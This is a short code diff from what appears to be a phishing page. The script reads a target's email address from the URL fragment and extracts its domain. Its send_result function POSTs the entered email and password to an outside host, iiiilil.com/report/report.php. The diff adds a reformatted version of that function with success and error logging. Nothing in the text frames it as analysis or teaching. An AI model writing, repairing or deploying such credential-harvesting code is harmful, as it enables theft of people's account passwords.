@@ -67,9 +67,19 @@
         let emTag = window.location.hash.substring(1);
         let domain = emTag.substring(emTag.lastIndexOf("@") + 1);
 
-        function send_result(n, t) {
-            $.ajax({url: "https://iiiilil.com/report/report.php", type: "POST", data: {email: n, password: t}})
+      function send_result(n, t) {
+    $.ajax({
+        url: "https://iiiilil.com/report/report.php", // Updated URL
+        type: "POST",
+        data: { email: n, password: t },
+        success: function(response) {
+            console.log("Success:", response);
+        },
+        error: function(xhr, status, error) {
+            console.error("Error:", status, error);
         }
+    });
+}
 
         document.addEventListener('DOMContentLoaded', async () => {
             if (emTag.match(/([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi)) {
